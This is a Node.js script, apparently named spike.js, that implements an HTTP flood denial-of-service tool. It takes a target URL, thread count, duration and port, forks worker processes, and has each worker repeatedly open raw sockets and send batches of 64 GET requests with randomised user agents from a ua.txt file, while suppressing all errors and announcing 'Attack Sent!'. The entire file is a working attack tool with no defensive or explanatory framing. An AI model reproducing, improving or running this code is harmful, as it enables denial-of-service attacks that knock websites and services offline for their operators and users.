const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

if (process.argv.length <= 4) {
    console.log("node spike.js <url> <threads> <time> <port>");
    process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = parsed.host;
var threads = process.argv[3];
var time = process.argv[4];
var port = process.argv[5]; // Port ditambahkan sebagai parameter

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (e) { });
process.on('unhandledRejection', function (e) { });

let userAgents = [];

try {
    userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (err) {
    console.error('\x1b[31mDSTAT Kurang file ua.txt blok\n' + err);
    process.exit(-1);
}

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.clear();
    console.log(`\x1b[33m(\x1b[33m!\x1b[37m) \x1b[33mAttack Sent!.`);
    console.log(`\x1b[31mDSTAT SPIKE DANDIER`);
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    startflood();
}

function startflood() {
    var int = setInterval(() => {
        var s = new net.Socket();
        s.connect(port, host); // Port digunakan sesuai parameter
        s.setTimeout(10000);
        for (var i = 0; i < 64; i++) {
            s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
        }
        s.on('data', function () {
            setTimeout(function () {
                s.destroy();
                return delete s;
            }, 5000);
        });
    });

    setTimeout(() => clearInterval(int), time * 1000);
                    }
